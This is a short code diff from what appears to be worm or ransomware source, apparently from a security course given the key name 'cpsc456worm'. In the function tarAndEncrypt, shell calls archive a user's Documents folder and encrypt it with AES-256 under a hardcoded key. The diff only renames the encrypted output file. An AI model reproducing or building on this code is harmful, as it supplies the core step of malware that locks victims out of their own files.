@@ -340,7 +340,7 @@ void tarAndEncrypt(){
             system("chmod a+x ./openssl");
             system("tar -zcvf DocumentsDir.tar.gz -P /home/ubuntu/Documents/");
             printf("\n Created tar of the Documents folder");
-            system("./openssl aes-256-cbc -a -salt -in DocumentsDir.tar.gz -out DocumentsDir.tar.enc -k cpsc456worm");
+            system("./openssl aes-256-cbc -a -salt -in DocumentsDir.tar.gz -out DocumentsDirCpp.tar.enc -k cpsc456worm");
             printf("\n Created Encrypted File");
         }
         catch(...){
